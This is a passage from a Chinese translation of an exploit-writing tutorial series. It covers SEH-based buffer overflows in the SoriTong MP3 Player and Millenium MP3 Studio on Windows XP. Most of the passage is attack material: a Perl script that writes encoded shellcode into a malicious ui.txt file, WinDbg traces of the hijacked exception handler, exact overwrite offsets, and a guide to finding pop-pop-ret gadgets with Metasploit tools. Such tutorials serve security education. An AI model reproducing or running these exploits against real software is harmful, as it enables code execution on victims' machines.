"\x48\x48\x30\x42\x33\x30\x42\x43\x56\x58\x32\x42\x44\x42\x48\x34".
"\x41\x32\x41\x44\x30\x41\x44\x54\x42\x44\x51\x42\x30\x41\x44\x41".
"\x56\x58\x34\x5a\x38\x42\x44\x4a\x4f\x4d\x4e\x4f\x4a\x4e\x46\x44".
"\x42\x30\x42\x50\x42\x30\x4b\x38\x45\x54\x4e\x33\x4b\x58\x4e\x37".
"\x45\x50\x4a\x47\x41\x30\x4f\x4e\x4b\x38\x4f\x44\x4a\x41\x4b\x48".
"\x4f\x35\x42\x32\x41\x50\x4b\x4e\x49\x34\x4b\x38\x46\x43\x4b\x48".
"\x41\x30\x50\x4e\x41\x43\x42\x4c\x49\x39\x4e\x4a\x46\x48\x42\x4c".
"\x46\x37\x47\x50\x41\x4c\x4c\x4c\x4d\x50\x41\x30\x44\x4c\x4b\x4e".
"\x46\x4f\x4b\x43\x46\x35\x46\x42\x46\x30\x45\x47\x45\x4e\x4b\x48".
"\x4f\x35\x46\x42\x41\x50\x4b\x4e\x48\x46\x4b\x58\x4e\x30\x4b\x54".
"\x4b\x58\x4f\x55\x4e\x31\x41\x50\x4b\x4e\x4b\x58\x4e\x31\x4b\x48".
"\x41\x30\x4b\x4e\x49\x38\x4e\x45\x46\x52\x46\x30\x43\x4c\x41\x43".
"\x42\x4c\x46\x46\x4b\x48\x42\x54\x42\x53\x45\x38\x42\x4c\x4a\x57".
"\x4e\x30\x4b\x48\x42\x54\x4e\x30\x4b\x48\x42\x37\x4e\x51\x4d\x4a".
"\x4b\x58\x4a\x56\x4a\x50\x4b\x4e\x49\x30\x4b\x38\x42\x38\x42\x4b".
"\x42\x50\x42\x30\x42\x50\x4b\x58\x4a\x46\x4e\x43\x4f\x35\x41\x53".
"\x48\x4f\x42\x56\x48\x45\x49\x38\x4a\x4f\x43\x48\x42\x4c\x4b\x37".
"\x42\x35\x4a\x46\x42\x4f\x4c\x48\x46\x50\x4f\x45\x4a\x46\x4a\x49".
"\x50\x4f\x4c\x58\x50\x30\x47\x45\x4f\x4f\x47\x4e\x43\x36\x41\x46".
"\x4e\x36\x43\x46\x42\x50\x5a";
my $junk2 = "\x90" x 1000;
open(myfile,'>ui.txt');
print myfile $junk.$nextSEHoverwrite.$SEHoverwrite.$shellcode.$junk2;
创建这个ui.txt文件并直接用soritong.exe打开（这时不是在调试器中）
pwned !
现在我们看一下背后到底发生了什么。在shellcode开始处置一个断点和用windbg运行
soritong.exe：
First chance exception :
栈顶地址（ESP）为0x0012da14
eax=00130000 ebx=00000003 ecx=ffffff90 edx=00000090 esi=0017e4ec edi=0012fd64
eip=00422e33 esp=0012da14 ebp=0012fd38 iopl=0 nv up ei ng nz ac pe nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00010296
0:000> !exchain
0012fd64: *** WARNING: Unable to verify checksum for C:\Program Files\SoriTong\Player.dll
*** ERROR: Symbol file could not be found. Defaulted to export symbols for C:\Program
Files\SoriTong\Player.dll -
Player!Player_Action+9528 (10018de8)
Invalid exception stack at 909006eb
=>EH Handler指向10018de8（pop pop ret），当我们让程序继续运行，pop pop ret指令串被执
行和将引发另一个异常。
接着“BE 06 90 90”被执行（next SEH域中）然后EIP将指向0012fd6c（shellcode）。
0:000> g
(f0c.b80): Break instruction exception - code 80000003 (first chance)
eax=00000000 ebx=00000000 ecx=10018de8 edx=7c9032bc esi=0012d72c edi=7c9032a8
eip=0012fd6c esp=0012d650 ebp=0012d664 iopl=0 nv up ei pl zr na pe nc
cs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000 efl=00000246
+0x12fd6b:
0012fd6c cc int 3
0:000> u 0012fd64
+0x12fd63:
0012fd64 eb06 jmp +0x12fd6b (0012fd6c)
0012fd66 90 nop
0012fd67 90 nop
0:000> d 0012fd60
0012fd60 41 41 41 41 eb 06 90 90-e8 8d 01 10 cc eb 03 59 AAAA...........Y
0012fd70 eb 05 e8 f8 ff ff ff 4f-49 49 49 49 49 49 51 5a .......OIIIIIIQZ
0012fd80 56 54 58 36 33 30 56 58-34 41 30 42 36 48 48 30 VTX630VX4A0B6HH0
0012fd90 42 33 30 42 43 56 58 32-42 44 42 48 34 41 32 41 B30BCVX2BDBH4A2A
0012fda0 44 30 41 44 54 42 44 51-42 30 41 44 41 56 58 34 D0ADTBDQB0ADAVX4
0012fdb0 5a 38 42 44 4a 4f 4d 4e-4f 4a 4e 46 44 42 30 42 Z8BDJOMNOJNFDB0B
0012fdc0 50 42 30 4b 38 45 54 4e-33 4b 58 4e 37 45 50 4a PB0K8ETN3KXN7EPJ
0012fdd0 47 41 30 4f 4e 4b 38 4f-44 4a 41 4b 48 4f 35 42 GA0ONK8ODJAKHO5B
41 41 41 41 :缓冲区中最后几个字符
eb 06 90 90 : next SEH, 跳过6 bytes
e8 8d 01 10 : 当前 SE Handler (pop pop ret, 引发下一个异常, 跳到next SEH 域中执行“eb 06
90 90”)
cc eb 03 59 : shellcode起点 (我加的CC为断点), 位于0x0012fd6c地址处
你可以从下面的视频中观看exploit的编写过程：
YouTube - Exploiting Soritong MP3 Player (SEH) on Windows XP SP3
http://www.youtube.com/watch?v=FYmfYOOrQ00
你可以在这里访问/观看我的播放列表（上面的视频和以后教程中的）
Writing Exploits：http://www.youtube.com/view_play_list?p=0E2E3562EB2A5ED3
通过memdump搜索pop pop ret（以及有用的指令）
在本文和以前的教程中，我们通过两中方法在DLL模块（或.exe drivers）去搜索指定的指令...
通过windbg搜索内存和用findjmp。这里还有一种方法搜索有用的指令：使用memdump。
Metasploit（linux版本）有一个叫memdump的功能组件（藏在tools文件夹中）。所以如果你
在windows的机器上安装了Metasploit，那么你就可以马上使用它。
首先，要运行你将尝试利用的程序，找到这个程序的进程ID
在硬盘上建一个文件夹然后运行：
memdump.exe processID c:\foldername
例如：
memdump.exe 3524 c:\cygwin\home\peter\memdump
[*] Creating dump directory...c:\cygwin\home\peter\memdump
[*] Attaching to 3524...
[*] Dumping segments...
[*] Dump completed successfully, 112 segments.
现在，在命令行下进入cygwin目录，运行msfpescan（可以直接在metasploit文件夹下找到）
然后把结果输出到一个txt文件。
peter@xptest2 ~/framework-3.2
$ ./msfpescan -p -M /home/peter/memdump > /home/peter/scanresults.txt
打开这个txt文件，你会得到所有你感兴趣的指令。
所有左边的地址都没有含NULL bytes，它们来自一个没有用/safeSEH选项编译的DLL模块中。
因此不需要你写出pop pop ret组合的机器码然后在内存中寻找，你可以用memdump转储内存
并一次性列出所有的pop pop ret组合。节省了你的时间
一些有用的调试器链接：
OllyDbg：http://www.ollydbg.de/
OllySSEH module ：http://www.openrce.org/downloads/details/244/OllySSEH
Ollydbg plugins ：http://www.openrce.org/downloads/browse/OllyDbg_Plugins
Windbg ：http://www.openrce.org/downloads/browse/OllyDbg_Plugins
Windbg !exploitable module：http://msecdbg.codeplex.com/
Exploit 编写教程第三篇 b：基于 SEH 的
Exploit-又一个实例
原：Peter Van Eeckhoutte 2009-7-28
译：看雪论坛-moonife-2009-11-29
在上一篇教程中，我已经讲述了基于SEH的Exploit。我提到在最简单的基于SEH exploit的
情形中，payload的构造如下所示：
[Junk][next SEH][SEH][Shellcode]
我已经展示了用指向pop pop ret指令串的指针覆盖SE Hanler域和用跳过6 bytes的jumpcode覆
盖next SEH域来跳过SE Handler...当然，这样的构造是基于多数SEH based 漏洞的特征以及
存在于Easy RMto MP3 Player（这里作者笔误，应该是上一篇中的soritong MP3 Player）上漏
洞的特殊性。因此它只是一个基于SEH类型漏洞下的例子。你确实需要用断点等来查看所有
寄存器，去找到你payload/shellcode所在的位置...根据栈来构造你的payload...只要想到！
有时候你会很幸运，轻松加愉快的就写出了payload。有时候你会很不走运，但你依然可以
在有难度的漏洞利用中写出跨平台的稳定Exploit。有时候你必须要硬编码一个地址，因为没
有其他可行方法了。无论是那种方法，大多数的Exploit都不尽相同。在特殊的漏洞利用中为
了找到有效的方法都得手工去完成。
在今天的教程中，我们用Millenium MP3 Studio 1.0上挖掘出来的漏洞来编写基于它的Exploit。
这个漏洞发布于：http://www.milw0rm.com/exploits/9277.
你可以在这里下载Millenium MP3 Studio：
从POC中可以看出这个漏洞是容易被利用的(很可能是基于寄存器的值)...可惜的是它并没有
如作者（发现这个漏洞和写出POC代码的人）所希望的那样进行利用。
如“Hack4love”贴图中的那样是基于寄存器的值，因此我们可以认为这是一个典型的栈溢
出，其中EIP被缓冲区的垃圾数据覆盖...你还需要找到缓冲区的偏移，找到一个寄存器指向
你的payload，用“jump to...”地址覆盖EIP，是这样吗？额....不完全正确。
我们来看下。创建一个用“http://”+5000 A’填充的文件...当你用windbg运行程序并打开这个
文件，你看到了什么？我们先来创建一个mpf文件：
my $sploitfile="c0d3r.mpf";
my $junk = "http://";
$junk=$junk."A"x5000;
my $payload=$junk;
print " [+] Writing exploit file $sploitfile\n";
open (myfile,">$sploitfile");
print myfile $payload;close (myfile);
print " [+] File written\n";
print " [+] " . length($payload)." bytes\n";
接着用windbg运行程序并打开这个文件：
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=0012f9b8 ebx=0012f9b8 ecx=00000000 edx=41414141 esi=0012e990 edi=00faa68c
eip=00403734 esp=0012e97c ebp=0012f9c0 iopl=0
nv up ei pl nz na pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000
efl=00010206*** WARNING: Unable to verify checksum for image
00400000*** ERROR: Module load completed but
symbols could not be loaded for image
00400000image00400000+0x3734:00403734 8b4af8 mov ecx,dword ptr [edx-8]
ds:0023:41414139=????????
Missing image name, possible paged-out or corrupt data.
不错，非法访问...但是各寄存器中的值和上面POC中贴出的寄存器值大不一样。所以缓冲区
的长度也是错误的（引发一个典型覆盖 EIP 的栈溢出），或者这是个基于 SEH 的问题。看下
SEH链发现：
0:000> !exchain0012f9a0:
+41414140 (41414141)
Invalid exception stack at 41414141
啊，好。Next SEH和SE Handler两个都被覆盖，因此这是个基于SEH的Exploit了。
为了了找出next SEH和SE Handler的偏移，我们用metasploit pattern构造另一个含5000个字符
的文件：
现在SEH 链如下所示：
0:000> !exchain0012f9a0:
+30684638 (30684639)
Invalid exception stack at 67463867
所以SE Handler被0x39466830（记住：小端字节序）覆盖，next SEH被0x67384667覆
● SE Handler : 0x39466830 = 9Fh0 (偏移为 4109)
● next SEH : 0x67384667 = g8Fg (偏移为 4105)
现在，在一个典型的SEH Exploit情形下，你要编写的payload如下所示：
-先是4105个垃圾字符（去掉讨厌的字符如http：后面的两个的反斜杠用A替代）
-用jumpcode（0xeb,0x06,0x90,0x90）覆盖next SEH，跳过SE Handler到shellcode开始的地方
-用指向pop pop ret指令串的地址覆盖SE Handler
-接着放上你的shellcode（两头加一些NOP是必要的），如果需要在附加上其他的数据
我们先在perl脚本中依然用特别的内容来验证关键域的偏移量：
my $totalsize=5005;
my $sploitfile="c0d3r.mpf";
my $junk = "http:AA";
$junk=$junk."A" x 4105;
my $nseh="BBBB";
my $seh="CCCC";
my $shellcode="D"x($totalsize-length($junk.$nseh.$seh));
my $payload=$junk.$nseh.$seh.$shellcode;
print " [+] Writing exploit file $sploitfile\n";
open (myfile,">$sploitfile");
print myfile $payload;
close (myfile);
print " [+] File written\n";
print " [+] " . length($payload)."
Crash :
(ac0.ec0): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=0012fba4 ebx=0012fba4 ecx=00000000 edx=44444444 esi=0012eb7c edi=00fb1c84
eip=00403734 esp=0012eb68 ebp=0012fbac iopl=0
nv up ei pl nz na pe nccs=001b ss=0023 ds=0023 es=0023 fs=003b gs=0000
efl=00010206*** WARNING: Unable to verify checksum for image
00400000*** ERROR: Module load completed but symbols could not be loaded for
image00400000image
00400000+0x3734:00403734 8b4af8 mov ecx,dword ptr [edx-8]
ds:0023:4444443c=????????